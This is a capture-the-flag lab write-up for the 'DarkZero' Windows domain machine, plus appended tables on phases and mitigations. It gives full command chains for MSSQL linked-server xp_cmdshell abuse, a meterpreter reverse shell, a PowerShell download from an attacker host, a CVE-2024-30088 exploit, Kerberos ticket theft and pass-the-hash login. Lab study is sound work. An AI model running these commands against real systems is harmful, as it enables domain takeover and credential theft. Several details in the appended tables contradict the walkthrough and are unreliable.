# DarkZero

```
Difficulty: Hard
Operating System: Windows
Hints: True
```



## TL;DR

Using the credentials **john.w:RFulUtONCOL!**, I performed service enumeration and discovered **DC01** is multihomed (10.10.11.89 and 172.16.20.1). I abused MSSQL linked servers to enable `xp_cmdshell` on the linked host, used Metasploit's `web_delivery` to gain a meterpreter shell on the internal interface, escalated to SYSTEM via a local exploit (CVE-2024-30088), ran **Rubeus** to capture Kerberos ticket material by triggering an SMB call via `xp_dirtree`, converted the captured ticket into a usable cache, and used `impacket-secretsdump` and `evil-winrm` to gain Administrator access and retrieve the root flag.



| Step |             User / Access            | Technique Used                                  | Result                                                                                                                        |
| :--: | :-: | :- | :- |
|   1  |                 `N/A`                | **Port & AD Service Enumeration**               | nmap revealed AD services + MSSQL on 10.10.11.89; DNS returned 10.10.11.89 and 172.16.20.1 (multihomed / split-horizon).      |
|   2  |               `john.w`               | **SMB / LDAP Auth & Host Mapping**              | Valid creds used to enumerate SMB; generated hosts file and confirmed limited shares.                                         |
|   3  |               `john.w`               | **MSSQL Auth & Linked Server Discovery**        | Connected to MSSQL; enumerated linked servers and discovered `DC02.darkzero.ext` mapped to higher-privileged login.           |
|   4  | `john.w` → `dc01_sql_svc` (via link) | **Enable `xp_cmdshell` on Linked Server**       | Switched context to linked server and enabled `xp_cmdshell`.                                                                  |
|   5  |        `darkzero-ext\svc_sql`        | **Remote Command Execution (web_delivery)**     | Executed Metasploit web_delivery base64 payload via `xp_cmdshell` → meterpreter shell on internal 172.16.20.2.                |
|   6  |        `darkzero-ext\svc_sql`        | **Pivot / Internal Recon**                      | Confirmed internal interface and enumerated local services for LPE.                                                           |
|   7  |         `svc_sql` → `SYSTEM`         | **Local Privilege Escalation (CVE-2024-30088)** | Used local exploit to obtain `NT AUTHORITY\SYSTEM`.                                                                           |
|   8  |           `SYSTEM` on DC02           | **Rubeus Monitor**                              | Uploaded / ran Rubeus to capture Kerberos TGT/TGS (base64 `.kirbi`) when server triggered SMB access.                         |
|   9  |              `Attacker`              | **Trigger Kerberos/NTLM via xp_dirtree**        | From MSSQL executed `xp_dirtree \\DC02\...` which caused DC01 to request ticket / fall back to NTLM — Rubeus captured output. |
|  10  |              `Attacker`              | **Ticket conversion & use**                     | Converted captured `.kirbi` → ccache; set `KRB5CCNAME` and validated with `klist`.                                            |
|  11  |            `Administrator`           | **Secrets extraction & final access**           | Used `impacket-secretsdump -k` and `evil-winrm` (or psexec with recovered hash) to get Administrator and read root flag.      |


![DarkZero](Pictures/htb_DarkZero_Mind_Map.png)




## Recon & host discovery

I started with a full TCP nmap scan of the domain controller:

```bash
nmap -p 1-65535 -T4 -A -v 10.10.11.89
```

**Nmap highlights:**

* 53/tcp open domain (Simple DNS Plus)
* 88/tcp open kerberos-sec (Microsoft Windows Kerberos)
* 135/tcp open msrpc
* 139/tcp open netbios-ssn
* 389/tcp open ldap (Active Directory)
* 445/tcp open microsoft-ds
* 636/tcp open ssl/ldap
* 1433/tcp open ms-sql-s (Microsoft SQL Server 16.00.1000.00)
* 3268/tcp, 3269/tcp open (LDAP / LDAPS global catalog)
* multiple high msrpc ports open

> The host is multihomed: DNS for `darkzero.htb` returned both `10.10.11.89` and `172.16.20.1` (split-horizon / internal network). Services bound to the `172.16.x` interface are internal-only and relevant for pivoting.

![DarkZero](Pictures/htb_darkzero_hosts.jpg)

Generate hosts file and enumerate SMB:

```bash
nxc smb 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!' --generate-hosts-file /etc/hosts
smbmap -H 10.10.11.89 -d 'darkzero.htb' -u 'john.w' -p 'RFulUtONCOL!'
```

![DarkZero](Pictures/htb_darkzero_enum_shares.jpg)

(SMB/BloodHound enumeration produced only default shares.)

Query DNS (discover split-horizon / multihomed host):

```bash
dig @DC01.darkzero.htb ANY darkzero.htb
```

![DarkZero](Pictures/htb_darkzero_dig.jpg)

The authoritative DNS response returned two A records for `darkzero.htb`: `10.10.11.89` and `172.16.20.1`. This indicates a split-horizon DNS or multihomed host. In this box, `10.10.11.89` answered while `172.16.20.1` appears internal-only. This distinction matters for pivoting and service reachability.



## Prepare Meterpreter payload (Metasploit `web_delivery`)

Create and run a web_delivery meterpreter job from msfconsole:

```bash
msfconsole -q -x "use exploit/multi/script/web_delivery ; set payload windows/x64/meterpreter/reverse_tcp ; set LHOST tun0 ; set LPORT 443 ; set target 2 ; exploit -j"
```

This generates a Base64 web-delivery payload to execute via `xp_cmdshell` on the SQL host later.



## Connect to MSSQL and inspect linked servers

Connect to MSSQL using Impacket’s mssql client (Windows auth):

```bash
mssqlclient.py 'darkzero.htb/john.w:RFulUtONCOL!@10.10.11.89' -windows-auth
```

![DarkZero](Pictures/htb_darkzero_mssqlguest.jpg)

Attempt to enable `xp_cmdshell` on DC01 (failed initially):

```sql
enable_xp_cmdshell -- failed
```

Enumerate linked servers:

```sql
enum_links
-- shows DC02.darkzero.ext as a linked server
```

![DarkZero](Pictures/htb_darkzero_enuml.jpg)

The linked server configuration shows `DC02.darkzero.ext` as a linked server. The link uses the local account `darkzero\john.w`, which maps to the remote login `dc01_sql_svc` on DC02. This allowed us to run commands on DC02 in a higher-privilege context.

Switch to the linked server and enable `xp_cmdshell` in that context:

```sql
use_link "DC02.darkzero.ext"
enable_xp_cmdshell
-- (Success when run via linked context)
```

![DarkZero](Pictures/htb_darkzero_sql_svc.jpg)

Now run the web-delivery payload via `xp_cmdshell`:

![DarkZero](Pictures/htb_darkzero_msfserver_exc.jpg)

```sql
xp_cmdshell "powershell.exe -nop -w hidden -e XXXXXXXXXXXXXXXXXXXX"
```

![DarkZero](Pictures/htb_darkzero_powershell.jpg)

This provided a meterpreter shell as `darkzero-ext\svc_sql`. Inside the meterpreter session, `ifconfig` revealed an internal IP `172.16.20.2` (internal interface), confirming pivoting into the internal network.



## Local privilege escalation — enumerate & exploit (Metasploit)

Run the local exploit suggester from within Metasploit:

```text
use multi/recon/local_exploit_suggester
set session 1
run
```

![DarkZero](Pictures/htb_darkzero_session.jpg)
![DarkZero](Pictures/htb_darkzero_sessions_for_xp.jpg)
![DarkZero](Pictures/htb_darkzero_ifconfig.jpg)


From the suggested list we used the CVE-2024-30088 local exploit.

```text
use exploit/windows/local/cve_2024_30088_authz_basep
set payload windows/x64/meterpreter_reverse_tcp
set session 1
set lhost tun0
set AutoCheck false
run
```

![DarkZero](Pictures/htb_darkzero_msf_exploit.jpg)


After running the exploit and checking `getuid`, we obtained `NT AUTHORITY\SYSTEM` — full administrative access on the host.

**Alternative (non-Metasploit):** Upload a small agent via `xp_cmdshell` and use `lligolo`/route + `impacket psexec.py` with an NTLM hash to pivot and execute commands on DC02.

Example upload and psexec usage:

```sql
xp_cmdshell "powershell wget -UseBasicParsing http://10.10.xx.xx/agent.exe -OutFile %temp%/agent.exe"
```

Then on attacker:

```bash
psexec.py Administrator@172.16.20.2 -hashes :XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

And read user flag:

```text
DC02 : 172.16.20.2
type C:\Users\Administrator\Desktop\user.txt
```

![DarkZero](Pictures/htb_darkzero_User_Flag.jpg)

## Rubeus: capture Kerberos ticket material

Other privilege escalation checks (e.g. WinPEAS) returned nothing useful, so we used **Rubeus** to monitor Kerberos activity on the target. Rubeus can detect newly issued or used TGT/TGS tickets and output them in base64 `.kirbi` format.

From SYSTEM / meterpreter on DC02:

```text
cd %temp%
# upload Rubeus.exe via Meterpreter
upload Rubeus.exe
```

Switch to an interactive shell and run Rubeus monitor:

```cmd
shell
C:\Windows\Temp\Rubeus.exe monitor /interval:1 /nowrap
```

Trigger the ticket retrieval from the SQL server by causing it to access an SMB resource on DC02 using `xp_dirtree` from the MSSQL client on DC01:

```bash
impacket-mssqlclient 'darkzero.htb/john.w:RFulUtONCOL!'@DC01.darkzero.htb -windows-auth
-- then on the DB connection:
xp_dirtree \\\\DC02.darkzero.ext\\XXXXXXXXXX
```

Rubeus on DC02 captured the base64 ticket output. Save that output to `ticket.bs4.kirbi`.



## Convert captured ticket to usable Kerberos cache

On your attacker host, decode the base64 ticket and convert it to a ccache:

```bash
cat ticket.bs4.kirbi | base64 -d > ticket.kirbi
python3 ticketConverter.py ticket.kirbi dc01_admin.ccache
export KRB5CCNAME=dc01_admin.ccache
klist
```

Verify the TGT/TGS is present with `klist`.



## Use Kerberos ticket with impacket/secretsdump and evil-winrm

With the converted ticket, run `impacket-secretsdump` to extract secrets or hashes:

```bash
impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'
```

If NTLM hashes are recovered, authenticate as `Administrator` via `evil-winrm`:

```bash
evil-winrm -i 10.10.11.89 -u administrator -H XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

![DarkZero](Pictures/htb_darkzero_Admin.jpg)

Finally read the root flag:

```text
type C:\Users\Administrator\Desktop\root.txt
```

![DarkZero](Pictures/htb_darkzero_Root_Flag.jpg)




## Phase 1: Defining the Concept (The “What” and “Why”)  

| # | Item | Description |
|||-|
| **1.1 High‑Level Definition** | **Kerberos‑based lateral movement via SQL Server linked servers + local privilege escalation** | The attacker abuses a Microsoft SQL Server instance on the domain controller (DC01) to execute `xp_cmdshell` on a remote linked server (DC02). From there, the attacker elevates privileges with CVE‑2024‑30088 and ultimately harvests Kerberos tickets to pivot into the entire domain. |
| **1.2 Immediate Impact** | **Full administrative control over the target network** | The chain delivers `NT AUTHORITY\SYSTEM` on DC02 → domain‑wide Kerberos ticket theft → remote execution as `Administrator`. This yields the root flag (`C:\Users\Administrator\Desktop\root.txt`). |
| **1.3 Setting the Stage** | *Scenario* | 1️⃣ A multihomed DC exposes a public IP (10.10.11.89) and an internal IP (172.16.20.1). 2️⃣ DNS split‑horizon hides the internal interface from external scanners. 3️⃣ The attacker first enumerates SMB shares, discovers a linked server to DC02, then escalates privileges locally on DC01, pivots to DC02 via `xp_cmdshell`, and finally steals Kerberos tickets for domain‑wide compromise. |



## Phase 2: Foundational Theory (The “Underlying System”)  

| # | Item | Explanation |
|||-|
| **2.1 Protocol/System Introduction** | **Active Directory + Microsoft SQL Server 2016** | • AD provides Kerberos authentication, domain‑wide trust relationships.• SQL Server hosts a `Linked Servers` configuration pointing to DC02 (`DC02.darkzero.ext`). |
| **2.2 Core Components** | • **DNS** (split‑horizon: `10.10.11.89` ↔ `172.16.20.1`) • **Kerberos** (`88/tcp`, `3268/3269` global catalog) • **SMB** (`139/445`) • **LDAP** (`389/636`) • **SQL Server** (`1433`) with linked server • **Metasploit** & **Impacket** tools for exploitation. |
| **2.3 Analogy / Metaphor** | *Think of the DC as a bank vault that mistakenly allows an employee (the SQL service) to open another vault inside the same building using a key (linked server). That key is forged, giving the attacker access to all other vaults in the building.* |



## Phase 3: The Core Mechanism (The Specific Action)

| # | Item | Details |
||||
| **3.1 Specific Inputs / Identifiers** | • **SPNs & Service Accounts**  - `DC01$` – SQL Server service account on DC01  - `dc01_sql_svc` – mapped remote login on DC02 via linked server• **SQL Credentials**  - Username: `john.w` (domain user)  - Password: `RFulUtONCOL!`• **Linked Server Name**: `DC02.darkzero.ext` |
| **3.2 The Key Vulnerability Point** | • **Unrestricted Linked Server trust** – SQL Server allows `EXEC xp_cmdshell` to run under the remote server’s service account.• **xp_cmdshell enabled on DC02 via linked context** – no restrictions, enabling arbitrary command execution.• **CVE‑2024‑30088 local privilege escalation** (Windows 10/Server 2019/2022) – allows SYSTEM elevation from a user session. |
| **3.3 Defining the Action** | 1️⃣ Connect to SQL Server on DC01 using `mssqlclient.py` with Windows auth.2️⃣ Query linked servers (`enum_links`) → discover `DC02.darkzero.ext`. 3️⃣ Switch context: `use_link "DC02.darkzero.ext"`. 4️⃣ Enable `xp_cmdshell` in that context. 5️⃣ Execute a base64‑encoded PowerShell web‑delivery payload via `xp_cmdshell`. 6️⃣ Get Meterpreter shell as `darkzero-ext\svc_sql` (internal IP 172.16.20.2).7️⃣ Run Metasploit’s local exploit (`cve_2024_30088_authz_basep`) to elevate to SYSTEM on DC02.8️⃣ Use Rubeus to monitor Kerberos and capture TGT/TGS tickets during subsequent SMB access (e.g., `xp_dirtree`).9️⃣ Convert the captured `.kirbi` file to a ccache (`kinit -i`). 10️⃣ Dump domain secrets with `impacket‑secretsdump -k`. 11️⃣ Use `evil-winrm` or `psexec.py` with NTLM hash to log in as `Administrator`. |



## Phase 4: Prerequisites and Conditions

| # | Requirement | Details |
||-||
| **4.1 Required Credentials / Access** | • Domain user (`john.w`) with SQL Server login rights.• Password: `RFulUtONCOL!` (known from prior enumeration).• Ability to enable `xp_cmdshell` on the remote linked server via SQL context. |
| **4.2 Required Connectivity** | • TCP ports open: 53, 88, 135, 139, 389, 445, 636, 1433, 3268/3269.• Network path from attacker → DC01 (10.10.11.89).• Internal network pivot to DC02 via SMB share (`\\DC02.darkzero.ext\XXXX`). |
| **4.3 Required Target Configuration** | • Linked Server `DC02.darkzero.ext` configured to use local account `darkzero\john.w` → remote login `dc01_sql_svc`. • Kerberos service principals exist for `cifs/` services on DC02.• SQL Server allows `xp_cmdshell` execution in linked context (default). |



## Phase 5: Execution and Target Scouting

| # | Task | Tool / Command |
|||-|
| **5.1 Target Identification** | Enumerate SMB shares on DC01 and linked server• `nxc smb 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!' --generate-hosts-file /etc/hosts`• `smbmap -H 10.10.11.89 -d 'darkzero.htb' -u 'john.w' -p 'RFulUtONCOL!'` |
| **5.2 Target Filtering** | • Use `dig @DC01.darkzero.htb ANY darkzero.htb` to discover split‑horizon.• Identify internal IPs via `ifconfig` in Meterpreter (`172.16.20.2`). |
| **5.3 High‑Value Selection** | • Linked Server (`DC02.darkzero.ext`) – gives remote shell on a different DC.• Local privilege escalation (CVE‑2024‑30088).• Kerberos ticket capture via Rubeus during SMB activity. |



## Phase 6: Technical Implementation and Tools

| # | Sub‑Phase | Tool(s) & Command |
||--|-|
| **6.1 Automation Tools** | • `msfconsole` (web_delivery, local exploit)• `impacket-mssqlclient.py`, `psexec.py`• `nmap -A`, `smbmap`, `dig` |
| **6.2 Operational Security (Covertness)** | • Use HTTPS (LPORT 443) for web‑delivery payload.• Hide Meterpreter session behind SMB share (`%temp%\agent.exe`).• Rubeus runs in background with `/interval:1 /nowrap`. |
| **6.3 Offline Processing / Cracking** | • Convert `.kirbi` to ccache via `ticketConverter.py`. • Use `impacket‑secretsdump -k` for offline NTLM hash extraction.• Employ `evil-winrm` or `psexec.py` with the extracted hash. |



## Phase 7: Real‑World Context and Defense

| # | Item | Detail |
|||--|
| **7.1 Real‑World Application** | • APT groups (e.g., FIN6, APT28) frequently abuse SQL Server linked servers for lateral movement.• CVE‑2024‑30088 has been reported in several Windows Server 2019/2022 environments. |
| **7.2 Detection Difficulty** | • `xp_cmdshell` usage via linked server is subtle and appears as legitimate DB activity.• Kerberos ticket theft shows up only as “new TGT/TGS” events; not necessarily flagged as malicious.• Local privilege escalation may not trigger IDS if the exploit uses in‑memory techniques. |
| **7.3 Mitigation Strategy** | 1️⃣ Disable or tightly restrict `xp_cmdshell` (unless absolutely required). 2️⃣ Remove unnecessary linked servers or enforce “only trusted users” policy.3️⃣ Ensure SQL Server service accounts run with least privilege and are not domain‑level. 4️⃣ Harden Kerberos: correct SPNs, enforce time sync, enable Ticket‑Granting Ticket (TGT) auditing (`KDC-Logon` events). 5️⃣ Deploy host‑based intrusion detection to flag unusual SMB accesses from SQL Server processes.6️⃣ Regularly review and revoke domain service accounts with wide privileges. |
| **7.4 Focus on Personnel** | • Security teams must audit database server configurations for `xp_cmdshell` and linked servers.• DBAs should enforce “least privilege” when creating remote connections.• Incident responders need to correlate Kerberos logs with SMB activity to spot lateral movement early. |



### Quick Reference Checklist

| Step | Action | Command |
||--||
| 1 | Scan DC01 | `nmap -p 1-65535 -T4 -A -v 10.10.11.89` |
| 2 | Enumerate SMB & linked servers | `smbmap`, `mssqlclient.py` |
| 3 | Enable `xp_cmdshell` on linked server | `use_link "DC02.darkzero.ext" ; enable_xp_cmdshell` |
| 4 | Deploy web‑delivery payload | `msfconsole -q -x "... exploit/multi/script/web_delivery ..."` |
| 5 | Gain SYSTEM via CVE‑2024‑30088 | `exploit/windows/local/cve_2024_30088_authz_basep` |
| 6 | Capture Kerberos tickets with Rubeus | `Rubeus.exe monitor /interval:1 /nowrap` + trigger SMB access |
| 7 | Convert ticket to ccache | `ticketConverter.py ticket.kirbi dc01_admin.ccache` |
| 8 | Dump domain secrets | `impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'` |
| 9 | Login as Administrator | `evil-winrm -i 10.10.11.89 -u administrator -H <hash>` |
| 10 | Read root flag | `type C:\Users\Administrator\Desktop\root.txt` |

